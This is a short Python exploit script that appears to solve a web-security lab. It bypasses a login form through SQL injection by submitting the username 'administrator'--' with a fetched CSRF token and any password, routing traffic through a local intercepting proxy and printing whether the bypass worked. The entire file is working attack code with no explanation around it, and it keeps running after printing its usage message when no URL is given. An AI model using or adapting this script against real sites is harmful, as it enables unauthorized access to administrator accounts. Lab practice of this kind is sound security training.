import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8082', 'https':'http://127.0.0.1:8082'}

def getCSRF(r):
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find('input')['value']
    return csrf


def exploitsqli(url):
    uri = '/login'
    full = url + uri
    username = "administrator'--"
    password = 'hfufjink'
    r = s.get(full, verify=False, proxies=proxies)
    csrf = getCSRF(r)
    data = {
             'csrf': csrf,
             'username': username,
             'password': password
    }

    q = s.post(full, verify=False, proxies=proxies, data=data)
    if "Log out" in q.text:
        return True
    else:
        return False


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print('[-] Usage python3 %s <url>' %sys.argv[0])
        print('[-] Example python3 %s example.com' %sys.argv[0])
    s = requests.Session()
    if exploitsqli(url):
        print("Login Bypassed")
    else:
        print("Login Bypassed failed")

